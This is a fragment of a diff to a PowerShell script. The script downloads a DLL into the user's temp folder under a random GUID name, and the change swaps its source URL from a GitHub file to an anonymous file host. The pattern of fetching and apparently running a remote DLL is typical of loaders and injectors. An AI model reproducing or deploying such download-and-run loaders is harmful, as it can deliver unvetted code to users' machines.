@@ -75,7 +75,7 @@ catch {
 $randomGuid = [System.Guid]::NewGuid().ToString()
 $dllFileName = "$randomGuid.dll"
 $dllPath = Join-Path $env:TEMP $dllFileName
-$dllUrl = "https://github.com/novaxstorex/delta/blob/main/delta.ps1"
+$dllUrl = "https://files.catbox.moe/1wlvqc.dll"
 
 try {
     Write-Host "[+] Downloading DLL from: $dllUrl" -ForegroundColor Cyan
